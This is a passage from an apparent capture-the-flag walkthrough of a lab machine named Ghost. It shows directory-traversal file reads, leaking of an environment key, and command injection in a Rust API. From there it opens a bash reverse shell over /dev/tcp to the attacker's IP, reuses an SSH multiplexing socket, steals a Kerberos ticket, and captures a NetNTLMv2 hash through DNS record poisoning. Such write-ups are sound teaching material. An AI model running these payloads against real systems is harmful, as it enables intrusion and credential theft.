    let (mut rs, _res) = ldap
        .search(
            &dn,
            Scope::Subtree,
            &format!("(&(displayName={})(intranetSecret={}))", username, secret),
            vec!["intranetSecret", "sAMAccountName"],
        )
        .await.or(Err(route_error(RouteErrorType::Unknown)))?
        .success().or_else(ldap_error)?;

    ldap.unbind().await.ok();

    if rs.is_empty() {
        return Err(route_error(RouteErrorType::NotFound));
    }

    let entry = SearchEntry::construct(rs.remove(0));
    match entry.attrs.get("sAMAccountName") {
        Some(values) => match values.get(0) {
            Some(username) => Ok(username.clone()),
            None => Err(route_error(RouteErrorType::Unknown))
        }
        None => Err(route_error(RouteErrorType::Unknown))
    }
}

```

In `backend/src/api/dev/scan.rs`, there’s an API endpoint for scanning blog posts:

```

// Scans an url inside a blog post
// This will be called by the blog to ensure all URLs in posts are safe
#[post("/scan", format = "json", data = "<data>")]
pub fn scan(_guard: DevGuard, data: Json<ScanRequest>) -> Json<ScanResponse> {
    // currently intranet_url_check is not implemented,
    // but the route exists for future compatibility with the blog
    let result = Command::new("bash")
        .arg("-c")
        .arg(format!("intranet_url_check {}", data.url))
        .output();

    match result {
        Ok(output) => {
            Json(ScanResponse {
                is_safe: true,
                temp_command_success: true,
                temp_command_stdout: String::from_utf8(output.stdout).unwrap_or("".to_string()),
                temp_command_stderr: String::from_utf8(output.stderr).unwrap_or("".to_string()),
            })
        }
        Err(_) => Json(ScanResponse {
            is_safe: true,
            temp_command_success: false,
            temp_command_stdout: "".to_string(),
            temp_command_stderr: "".to_string(),
        })
    }
}

```

This defines an API endpoint that takes a POST with JSON data. At the start it takes the `url` parameter and uses it in a `bash -c` command in an unsafe way. There’s command injection there!

`DevGuard` is defined in `backend/src/api/dev.rs`, which just checks that the `X-DEV-INTRANET-KEY"` header matches the value in the environment variable:

```

#[rocket::async_trait]
impl<'r> FromRequest<'r> for DevGuard {
    type Error = ();

    async fn from_request(request: &'r Request<'_>) -> Outcome<Self, Self::Error> {
        let key = request.headers().get_one("X-DEV-INTRANET-KEY");
        match key {
            Some(key) => {
                if key == std::env::var("DEV_INTRANET_KEY").unwrap() {
                    Outcome::Success(DevGuard {})
                } else {
                    Outcome::Error((Status::Unauthorized, ()))
                }
            },
            None => Outcome::Error((Status::Unauthorized, ()))
        }
    }
}

```

### Recover DEV\_INTRANET\_KEY

#### File Read

According to the Ghost docs on [the API](https://ghost.org/docs/content-api/) and [the Content / Posts API](https://ghost.org/docs/content-api/#posts), the content API should be at `/ghost/api/content/posts/`. It returns JSON, and requires auth:

```

oxdf@hacky$ curl 'http://ghost.htb:8008/ghost/api/content/posts/' -s | jq .
{
  "errors": [
    {
      "message": "Authorization failed",
      "context": "Unable to determine the authenticated member or integration. Check the supplied Content API Key and ensure cookies are being passed through if member auth is failing.",
      "type": "NoPermissionError",
      "details": null,
      "property": null,
      "help": null,
      "code": null,
      "id": "1ff8d8d0-0c04-11f0-a4b4-69e01dcdbdd8",
      "ghostErrorCode": null
    }
  ]
}

```

The docs show adding a key as a GET parameter, and that works:

```

oxdf@hacky$ curl 'http://ghost.htb:8008/ghost/api/content/posts/?key=a5af628828958c976a3b6cc81a' -s | jq .
{
  "posts": [
    {
      "id": "65bdd2dc26db7d00010704b5",
      "uuid": "22db47b3-bbf6-426d-9fcf-887363df82cf",
      "title": "Embarking on the Supernatural Journey: Welcome to Ghost!",
      "slug": "embarking-on-the-supernatural-journey-welcome-to-ghost",
      "html": "<p>Greetings, fellow seekers of the unknown!</p><p>It is with great excitement and a touch of trepidation that we welcome you to the digital realm of Ghost, your go-to destination for unraveling the mysteries that lie beyond the veil of the ordinary. As we embark on this supernatural journey together, allow us to extend our hand and guide you through the shadowy corridors of the unexplained.</p><h2 id=\"why-ghost\">Why Ghost?</h2><p>The quest to understand the supernatural has been etched into the fabric of human history. From ancient legends to modern-day tales, the fascination with ghosts and the paranormal is a thread that binds us across time and cultures. Ghost emerges as a beacon for those who yearn to explore the realms beyond our comprehension.</p><h2 id=\"what-to-expect\">What to Expect</h2><p>Our digital abode is more than just a collection of stories; it's a haven for the curious, the intrepid, and the inquisitive. Here, you'll find:</p><ol><li><strong>Investigative Chronicles</strong>: Join us as we recount our journeys into haunted locations, sharing the spine-chilling encounters, unexplained phenomena, and the secrets that linger in the darkness.</li><li><strong>Tech Tuesdays</strong>: Stay at the forefront of paranormal research with our weekly dives into the latest ghost-hunting gadgets, software, and techniques. Knowledge is our strongest ally in the face of the unknown.</li><li><strong>Spotlight Series</strong>: Get to know the passionate individuals behind the investigations. Our Spotlight Series puts a face to the name, sharing the stories and expertise of our dedicated team.</li><li><strong>Community Corner</strong>: Ghost is more than a website; it's a community. Share your own supernatural experiences, theories, and questions in our Community Corner. Together, we amplify the voices seeking to understand the inexplicable.</li></ol><h2 id=\"join-us-on-this-extraordinary-expedition\">Join Us on this Extraordinary Expedition</h2><p>The journey into the paranormal is not for the faint of heart, but it is a journey worth taking. As we lift the veil on the mysteries that surround us, we invite you to be an active participant in this extraordinary expedition. Engage with our content, share your thoughts, and let the spirit of exploration guide us into uncharted territories.</p><p>Ghost is not just a website; it's a portal to the enigmatic, a gateway to the supernatural, and a testament to the boundless curiosity that defines the human spirit.</p><p>Welcome to our realm. Let the haunting begin!</p><p>Happy ghost hunting,</p><p>The Ghost Team</p>",
      "comment_id": "659cdeec9cd6330001baefbf",
      "feature_image": null,
      "featured": true,
      "visibility": "public",
      "created_at": "2024-01-09T05:51:40.000+00:00",
      "updated_at": "2024-01-09T05:52:59.000+00:00",
      "published_at": "2024-01-09T05:52:29.000+00:00",
      "custom_excerpt": null,
      "codeinjection_head": null,
      "codeinjection_foot": null,
      "custom_template": null,
      "canonical_url": null,
      "url": "http://ghost.htb/embarking-on-the-supernatural-journey-welcome-to-ghost/",
      "excerpt": "Greetings, fellow seekers of the unknown!\n\nIt is with great excitement and a touch of trepidation that we welcome you to the digital realm of Ghost, your go-to destination for unraveling the mysteries that lie beyond the veil of the ordinary. As we embark on this supernatural journey together, allow us to extend our hand and guide you through the shadowy corridors of the unexplained.\n\n\nWhy Ghost?\n\nThe quest to understand the supernatural has been etched into the fabric of human history. From anc",
      "reading_time": 1,
      "access": true,
      "comments": false,
      "og_image": null,
      "og_title": null,
      "og_description": null,
      "twitter_image": null,
      "twitter_title": null,
      "twitter_description": null,
      "meta_title": null,
      "meta_description": null,
      "email_subject": null,
      "frontmatter": null,
      "feature_image_alt": null,
      "feature_image_caption": null
    }
  ],
  "meta": {
    "pagination": {
      "page": 1,
      "limit": 15,
      "pages": 1,
      "total": 1,
      "next": null,
      "prev": null
    }
  }
}

```

If I add `&extra=<path>`, it should add the contents of that file to the `meta` section of the output. I don’t know any legit files there, so I’ll go right for the directory traversal:

```

oxdf@hacky$ curl 'http://ghost.htb:8008/ghost/api/content/posts/?key=a5af628828958c976a3b6cc81a&extra=../../../../etc/hosts' -s | jq '.meta.extra["../../../../etc/hosts"]' -r
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.19.0.2      26ae7990f3dd

```

With a little `jq` foo it prints the file completely!

I’ll write a quick `bash` script to read files:

```

#!/bin/bash

if [[ $# -ne 1 ]]; then
    echo "Usage: $0 <absolute path>"
    exit 1
fi

curl "http://ghost.htb:8008/ghost/api/content/posts/?key=a5af628828958c976a3b6cc81a&extra=../../../../${1}" -s | jq '.meta.extra["../../../../'${1}'"]' -r

```

It works:

```

oxdf@hacky$ ./file_read.sh /etc/passwd
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
node:x:1000:1000:Linux User,,,:/home/node:/bin/sh

```

#### Recover Env

`/proc/self` has information about the current process. The README suggested that both the blog application and the backend would have the same environment variable. I can access the command line:

```

oxdf@hacky$ ./file_read.sh /proc/self/cmdline
nodecurrent/index.js

```

And the environment variables in this process:

```

oxdf@hacky$ ./file_read.sh /proc/self/environ | tr '\000' '\n'
HOSTNAME=26ae7990f3dd
database__debug=false
YARN_VERSION=1.22.19
PWD=/var/lib/ghost
NODE_ENV=production
database__connection__filename=content/data/ghost.db
HOME=/home/node
database__client=sqlite3
url=http://ghost.htb
DEV_INTRANET_KEY=!@yqr!X2kxmQ.@Xe
database__useNullAsDefault=true
GHOST_CONTENT=/var/lib/ghost/content
SHLVL=0
GHOST_CLI_VERSION=1.25.3
GHOST_INSTALL=/var/lib/ghost
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
NODE_VERSION=18.19.0
GHOST_VERSION=5.78.0

```

There’s the key!

There’s also a database path there for the Ghost blog. I can try to pull this via the file read, but it come back corrupt:

```

oxdf@hacky$ ./file_read.sh /proc/self/cwd/content/data/ghost.db > ghost.db
oxdf@hacky$ file ghost.db 
ghost.db: SQLite 3.x database, last written using SQLite version 0, file counter 239, database pages 3216834560, 1st free page 15712189, free pages 239, cookie 0xbfbd0000, schema 393216, cache page size 15712189, largest root page 4, unknown 0 encoding, vacuum mode 1, version-valid-for 0
oxdf@hacky$ sqlite3 ghost.db 
SQLite version 3.45.1 2024-01-30 16:01:20
Enter ".help" for usage hints.
sqlite> .tables
Error: database disk image is malformed

```

There is a password hash for kathryn.holland:

```

oxdf@hacky$ strings ghost.db
...[snip]...
$10$lSwOgij5ynSgNi0uwAhhQu7aV5IOnhwrYIKctWko7fAZ6h5Ci6j0.kathryn.holland@ghost.htb{"nightShift":true}activepublic2024-02-03 05:44:212024-02-01 23:54:4012024-02-03 05:44:261
...[snip]...

```

I am not able to crack it.

### API Command Injection

#### Find API

The README suggests the dev API would be at `http://intranet.ghost.htb/api-dev`. That doesn’t work, but trying port 8008 does:

```

oxdf@hacky$ curl http://intranet.ghost.htb/api-dev
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">
<HTML><HEAD><TITLE>Not Found</TITLE>
<META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>
<BODY><h2>Not Found</h2>
<hr><p>HTTP Error 404. The requested resource is not found.</p>
</BODY></HTML>
oxdf@hacky$ curl http://intranet.ghost.htb:8008/api-dev

<html>
<head><title>301 Moved Permanently</title></head>
<body>
<center><h1>301 Moved Permanently</h1></center>
<hr><center>nginx/1.18.0 (Ubuntu)</center>
</body>
</html>

```

The endpoint I’m looking for is a POST to `/scan`:

```

oxdf@hacky$ curl -X POST http://intranet.ghost.htb:8008/api-dev/scan -H "Content-Type: application/json"
null

```

Once I set the `Content-Type` header, it works find the endpoint. I’ll add the `X-DEV-INTRANET-KEY` header and a body:

```

oxdf@hacky$ curl http://intranet.ghost.htb:8008/api-dev/scan -d '{"url": "http://10.10.14.6/test"}' -H "Content-Type: application/json" -H 'X-DEV-INTRANET-KEY: !@yqr!X2kxmQ.@Xe' -s | jq .
{
  "is_safe": true,
  "temp_command_success": true,
  "temp_command_stdout": "",
  "temp_command_stderr": "bash: line 1: intranet_url_check: command not found\n"
}

```

Interestingly, it fails to make a connection because the `internet_url_check` binary isn’t there.

#### Command Injection POC

I’ll add a simple command injection to the end of my `url` parameter:

```

oxdf@hacky$ curl http://intranet.ghost.htb:8008/api-dev/scan -d '{"url": "http://10.10.14.6/; id"}' -H "Content-Type: application/json" -H 'X-DEV-INTRANET-KEY: !@yqr!X2kxmQ.@Xe' -s | jq .
{
  "is_safe": true,
  "temp_command_success": true,
  "temp_command_stdout": "uid=0(root) gid=0(root) groups=0(root)\n",
  "temp_command_stderr": "bash: line 1: intranet_url_check: command not found\n"
}

```

The output of the `id` command makes it to `temp_command_stdout`!

#### Shell

I’ll replace `id` with a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw), and on sending, it just hangs:

```

oxdf@hacky$ curl http://intranet.ghost.htb:8008/api-dev/scan -d '{"url": "http://10.10.14.6/; bash -i >& /dev/tcp/10.10.14.6/443 0>&1"}' -H "Content-Type: application/json" -H 'X-DEV-INTRANET-KEY: !@yqr!X2kxmQ.@Xe'

```

At `nc`, there’s a shell:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.24 49806
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@36b733906694:/app# 

```

I’ll upgrade the shell using [the script trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```

root@36b733906694:/app# script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
root@36b733906694:/app# ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            ‍reset
reset: unknown terminal type unknown
Terminal type? screen
root@36b733906694:/app# 

```

## Auth as florence.ramirez

### Enumeration in Container

The `/app` directory has `database.sqlite`, but there’s nothing interesting in it, as auth is done via LDAP.

```

root@36b733906694:/app# ls
database.sqlite  ghost_intranet

```

At the filesystem root, there’s a `.dockerenv` file confirming that I’m in a container:

```

root@36b733906694:/# ls -a
.           app   dev                   home   media  proc  sbin  tmp
..          bin   docker-entrypoint.sh  lib    mnt    root  srv   usr
.dockerenv  boot  etc                   lib64  opt    run   sys   var

```

There’s also a `docker-entrypoint.sh`:

```

#!/bin/bash

mkdir /root/.ssh
mkdir /root/.ssh/controlmaster
printf 'Host *\n  ControlMaster auto\n  ControlPath ~/.ssh/controlmaster/%%r@%%h:%%p\n  ControlPersist yes' > /root/.ssh/config

exec /app/ghost_intranet

```

In `/root`, there’s a `.ssh` directory with these files as setup by the entrypoint script:

```

root@36b733906694:~/.ssh# ls -l
total 16
-rw-r--r-- 1 root root   92 Mar 26 21:35 config
drwxr-xr-x 1 root root 4096 Mar 26 21:36 controlmaster
-rw------- 1 root root  978 Jul  5  2024 known_hosts
-rw-r--r-- 1 root root  142 Jul  5  2024 known_hosts.old

```

`config` and `controlmaster` are part of an SSH setup called [SSH Multiplexing](https://en.wikibooks.org/wiki/OpenSSH/Cookbook/Multiplexing#Setting_Up_Multiplexing). Just like in that wiki article from OpenSSH, the `config` file sets this up:

```

Host *
  ControlMaster auto
  ControlPath ~/.ssh/controlmaster/%r@%h:%p
  ControlPersist yes

```

The file in `controlmaster` shows there’s a persistent connections to `dev-workstation` as florence.ramirez:

```

root@36b733906694:~/.ssh# ls -l controlmaster/
total 0
srw------- 1 root root 0 Mar 26 21:36 florence.ramirez@ghost.htb@dev-workstation:22
root@36b733906694:~/.ssh# file controlmaster/florence.ramirez\@ghost.htb\@dev-workstation\:22 
controlmaster/florence.ramirez@ghost.htb@dev-workstation:22: socket

```

It’s a socket file that will allow for reusing the connection.

### SSH to LINUX-DEV-WS01

With the connection already persisted, I can just `ssh` to that box as florance.ramirez and it will use the previous authentication:

```

root@36b733906694:~/.ssh# ssh florence.ramirez@ghost.htb@dev-workstation   
Last login: Thu Feb  1 23:58:45 2024 from 172.18.0.1
florence.ramirez@LINUX-DEV-WS01:~$

```

### Linux-DEV-WS01 Enumeration

#### Domain Configuration

`/home` has a `GHOST` directory, and in it is `florence.ramirez`:

```

florence.ramirez@LINUX-DEV-WS01:/home$ find . -ls
   961593      4 drwxrwxr-x   1 root     root         4096 Feb  1  2024 .
   969194      4 drwxr-xr-x   3 root     root         4096 Feb  1  2024 ./GHOST
   969195      4 drwxr-xr-x   2 root     root         4096 Feb  1  2024 ./GHOST/florence.ramirez
   969196      0 lrwxrwxrwx   1 root     root            9 Feb  1  2024 ./GHOST/florence.ramirez/.bash_history -> /dev/null

```

There’s no florence entry in `/etc/passwd`. That’s because the machine is authenticating off the active directory domain. It’s configured in `/etc/krb5.conf`:

```

[logging]
    default = FILE:/var/log/krb5.log
    kdc = FILE:/var/log/kdc.log
    admin_server = FILE:/var/log/kadmind.log

[libdefaults]
    default_realm = GHOST.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false

[realms]
    GHOST.HTB = {
        kdc = dc01.ghost.htb
        admin_server = dc01.ghost.htb
        default_domain = GHOST.HTB
    }
    ghost.htb = {
        kdc = dc01.ghost.htb
        admin_server = dc01.ghost.htb
        default_domain = ghost.htb
    }
    GHOST = {
        kdc = dc01.ghost.htb
        admin_server = dc01.ghost.htb
        default_domain = GHOST.HTB
    }

[domain_realm]
    .ghost.htb = GHOST.HTB
    ghost.htb = GHOST.HTB

```

`/etc/nsswitch.conf` shows that both `passwd` and `group` can be read from file or `winbind`:

```

# /etc/nsswitch.conf
#
# Example configuration of GNU Name Service Switch functionality.
# If you have the `glibc-doc-reference' and `info' packages installed, try:
# `info libc "Name Service Switch"' for information about this file.

passwd:         files winbind
group:          files winbind
shadow:         files
gshadow:        files

hosts:          files dns
networks:       files

protocols:      db files
services:       db files
ethers:         db files
rpc:            db files

netgroup:       nis

```

`wbinfo -u` shows users the machine knows about:

```

florence.ramirez@LINUX-DEV-WS01:/etc$ wbinfo -u
administrator
guest
krbtgt
ghost-corp$
kathryn.holland
cassandra.shelton
robert.steeves
florence.ramirez
justin.bradley
arthur.boyd
beth.clark
charles.gray
jason.taylor
intranet_principal
gitea_temp_principal

```

#### Kerberos Ticket

As the machine is connected to the domain and I’m authenticated as florence.ramirez likely over kerberos. I’ll check:

```

florence.ramirez@LINUX-DEV-WS01:~$ klist
Ticket cache: FILE:/tmp/krb5cc_50
Default principal: florence.ramirez@GHOST.HTB

Valid starting     Expires            Service principal
03/28/25 21:38:02  03/29/25 07:38:02  krbtgt/GHOST.HTB@GHOST.HTB
        renew until 03/29/25 21:38:01

```

There’s a ticket stored in `/tmp/krb5cc_50`. This also shows up in the environment vars:

```

florence.ramirez@LINUX-DEV-WS01:~$ env
SHELL=/bin/bash
PWD=/home/GHOST/florence.ramirez
KRB5CCNAME=FILE:/tmp/krb5cc_50
LOGNAME=florence.ramirez
MOTD_SHOWN=pam
HOME=/home/GHOST/florence.ramirez
SSH_CONNECTION=172.18.0.3 58102 172.18.0.2 22
USER=florence.ramirez
SHLVL=1
SSH_CLIENT=172.18.0.3 58102 22
PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
SSH_TTY=/dev/pts/1
_=/usr/bin/env
OLDPWD=/etc

```

I’ll encode the ticket:

```

florence.ramirez@LINUX-DEV-WS01:~$ base64 /tmp/krb5cc_50            
BQQADAABAAgAAAAAAAAAAAAAAAEAAAABAAAACUdIT1NULkhUQgAAABBmbG9yZW5jZS5yYW1pcmV6
AAAAAQAAAAEAAAAJR0hPU1QuSFRCAAAAEGZsb3JlbmNlLnJhbWlyZXoAAAABAAAAAwAAAAxYLUNB
...[snip]...
EezwH34tNPHN2P9tR3yaRdJzcjGgj/+DoBB/h2X1wnuBNQip+jceVg0QESmtHi58x0wvuii6OESO
IYznKMIJBLfrKj97r92kl7tZbWZzxPZvvBGysZh5A7dqN5kT++N8OIpihMQ8dVt7sDEAAAAA

```

I can copy that and decode it on my host:

```

oxdf@hacky$ echo "BQQADAABAAgAAAAAAAAAAAAAAAEAAAABAAAACUdIT1NULkhUQgAAABBmbG9yZW5jZS5yYW1pcmV6
AAAAAQAAAAEAAAAJR0hPU1QuSFRCAAAAEGZsb3JlbmNlLnJhbWlyZXoAAAABAAAAAwAAAAxYLUNB
...[snip]...
EezwH34tNPHN2P9tR3yaRdJzcjGgj/+DoBB/h2X1wnuBNQip+jceVg0QESmtHi58x0wvuii6OESO
IYznKMIJBLfrKj97r92kl7tZbWZzxPZvvBGysZh5A7dqN5kT++N8OIpihMQ8dVt7sDEAAAAA" | base64 -d > florence.ramirez.krb5cc

```

By setting my `KRB5CCNAME` variable to point to that ticket, I am florence.ramirez.

```

oxdf@hacky$ KRB5CCNAME=florence.ramirez.krb5cc klist
Ticket cache: FILE:florence.ramirez.krb5cc
Default principal: florence.ramirez@GHOST.HTB

Valid starting       Expires              Service principal
03/28/2025 21:42:02  03/29/2025 07:42:02  krbtgt/GHOST.HTB@GHOST.HTB
        renew until 03/29/2025 21:42:02

```

## Shell as justin.bradley

### Enumeration

With authentication as florence.ramirez, I can run tools like `netexec`:

```

oxdf@hacky$ KRB5CCNAME=florence.ramirez.krb5cc netexec smb ghost.htb --use-kcache
SMB         ghost.htb       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:ghost.htb) (signing:True) (SMBv1:False)
SMB         ghost.htb       445    DC01             [+] ghost.htb\florence.ramirez from ccache 

```

I can also collect Bloodhound data:

```

oxdf@hacky$ KRB5CCNAME=florence.ramirez.krb5cc bloodhound-python -c all -k -no-pass -d ghost.htb -u florence.ramirez --use-ldaps -d ghost.htb -ns 10.10.11.24 --zip 
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: ghost.htb
INFO: Using TGT from cache
INFO: Found TGT with correct principal in ccache file.
INFO: Connecting to LDAP server: dc01.ghost.htb
INFO: Found 1 domains
INFO: Found 2 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc01.ghost.htb
INFO: Found 16 users
INFO: Found 57 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 20 containers
INFO: Found 1 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: linux-dev-ws01.ghost.htb
INFO: Querying computer: DC01.ghost.htb
WARNING: Could not resolve: linux-dev-ws01.ghost.htb: The resolution lifetime expired after 3.103 seconds: Server Do53:10.10.11.24@53 answered The DNS operation timed out.
INFO: Done in 00M 18S
INFO: Compressing output into 20250328222944_bloodhound.zip

```

My Bloodhound installation process is detailed [here](/2025/03/15/htb-certified.html#collection). There are some issues that can come up trying to collect this data (spoiler, it’s DNS). I’ll go into those in [Beyond Root](#beyond-root).

There’s nothing in the Bloodhound data for the next step, but I’ll come back to it throughout the rest of the box.

### Strategy

In the forums, justin.bradley was complaining that their automation scripts to check pipeline results are working great on Gitea, but when he tries to adapt them to work on `bitbucket.ghost.htb`, it doesn’t work:

![image-20250328180349554](/img/image-20250328180349554.png)

The response from kathryn.holland is that the DNS entry is not set up yet:

![image-20250328180412396](/img/image-20250328180412396.png)

They tell justin to continue running the script as they will be set up shortly!

Now that I can authenticate to the domain, typically any domain user can create DNS entries that don’t exist! If I can create one for `bitbucket.ghost.htb`, the script may try to auth to me, and I can capture the NetNTLMv2 hash.

justin.bradley is a member of the remote management users group, so if I can compromise their account, I can likely get a shell using WinRM:

![image-20250329071705594](/img/image-20250329071705594.png)

### Setup Responder

I’ll clone [Responder](https://github.com/lgandx/Responder) and setup a virtualenv with the requirements:

```

oxdf@hacky$ git clone https://github.com/lgandx/Responder
Cloning into 'Responder'...
remote: Enumerating objects: 2465, done.
remote: Counting objects: 100% (757/757), done.
remote: Compressing objects: 100% (263/263), done.
remote: Total 2465 (delta 588), reused 494 (delta 494), pack-reused 1708 (from 4)
Receiving objects: 100% (2465/2465), 2.60 MiB | 20.17 MiB/s, done.
Resolving deltas: 100% (1572/1572), done.
oxdf@hacky$ cd Responder/
oxdf@hacky$ python -m venv venv
oxdf@hacky$ source venv/bin/activate
(venv) oxdf@hacky$ pip install -r requirements.txt 
Collecting netifaces>=0.10.4 (from -r requirements.txt (line 1))
  Downloading netifaces-0.11.0.tar.gz (30 kB)
  Installing build dependencies ... done
  Getting requirements to build wheel ... done
  Preparing metadata (pyproject.toml) ... done
Building wheels for collected packages: netifaces
  Building wheel for netifaces (pyproject.toml) ... done
  Created wheel for netifaces: filename=netifaces-0.11.0-cp312-cp312-linux_x86_64.whl size=35949 sha256=1d7db086795ac9cdad32bc1d76e46bfcf4b8be614a3beda56146945d545b076c
  Stored in directory: /home/oxdf/.cache/pip/wheels/63/fa/57/da80d0ffc8f993315c479b7cd4c8fb1c23910c8baccf6b1b27
Successfully built netifaces
Installing collected packages: netifaces
Successfully installed netifaces-0.11.0

```

I’ll run this with the `tun0` interface:

```

oxdf@hacky$ sudo python Responder.py -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.5.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.6]
    Responder IPv6             [dead:beef:2::1004]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-4U0JFEFHNV6]
    Responder Domain Name      [3YL2.LOCAL]
    Responder DCE-RPC Port     [48936]

[+] Listening for events...

[!] Error starting TCP server on port 53, check permissions or other servers running.

```

### Edit DNS Record

I’ll use [dnstool.py](https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py) to add a DNS record:

```

oxdf@hacky$ KRB5CCNAME=florence.ramirez.krb5cc python dnstool.py -u "ghost.htb\\florence.ramirez" -k -a add -r bitbucket --zone ghost.htb --data 10.10.14.6 -dns-ip 10.10.11.24 DC01.ghost.htb
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully

```
- `-u ghost.htb\\florence.ramirez` - the user to authenticate as;
- `-k` - use kerberos;
- `-a add` - the action is add;
- `-r bitbucket` - the record to add;
- `--zone ghost.htb` - the zone to add the record in;
- `--data 10.10.14.6` - the value for the record, my `tun0` IP;
- `-dns-ip 10.10.11.24` - help it to find the DC since there’s no DNS in HTB.

I can remove `-a add` and `--data 10.10.14.6` and it will return the record showing it worked:

```

oxdf@hacky$ KRB5CCNAME=~/hackthebox/ghost-10.10.11.24/florence.ramirez.krb5cc python dnstool.py -u ghost.htb\\florence.ramirez -k -r bitbucket --zone ghost.htb -dns-ip 10.10.11.24 DC01.ghost.htb
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found record bitbucket
DC=bitbucket,DC=ghost.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=ghost,DC=htb
Record is tombStoned (inactive)
[+] Record entry:
 - Type: 1 (A) (Serial: 255)
 - Address: 10.10.14.6
DC=bitbucket,DC=ghost.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=ghost,DC=htb
Record is tombStoned (inactive)
[+] Record entry:
 - Type: 0 (ZERO) (Serial: 254)
 - Tombstoned at: 2025-03-28 22:19:29.940560

```

Not long after, there’s a connection at Responder from Ghost:

```

[HTTP] NTLMv2 Client   : 10.10.11.24
[HTTP] NTLMv2 Username : ghost\justin.bradley
[HTTP] NTLMv2 Hash     : justin.bradley::ghost:79d32e6b0effca89:1CC70193C039E78478ACCC2D7A3A408B:01010000000000000741F1302FA0DB013C34CD505F508D750000000002000800330059004C00320001001E00570049004E002D003400550030004A0046004500460048004E005600360004001400330059004C0032002E004C004F00430041004C0003003400570049004E002D003400550030004A0046004500460048004E00560036002E00330059004C0032002E004C004F00430041004C0005001400330059004C0032002E004C004F00430041004C000800300030000000000000000000000000400000E0888E65A75234C57251CE9C88F8D59A7BD7523647D2C18BE64CFE3BDBD185A20A001000000000000000000000000000000000000900300048005400540050002F006200690074006200750063006B00650074002E00670068006F00730074002E006800740062000000000000000000

```

### Crack NetNTLMv2

I’ll save that hash to a file and feed it to `hashcat`:

```

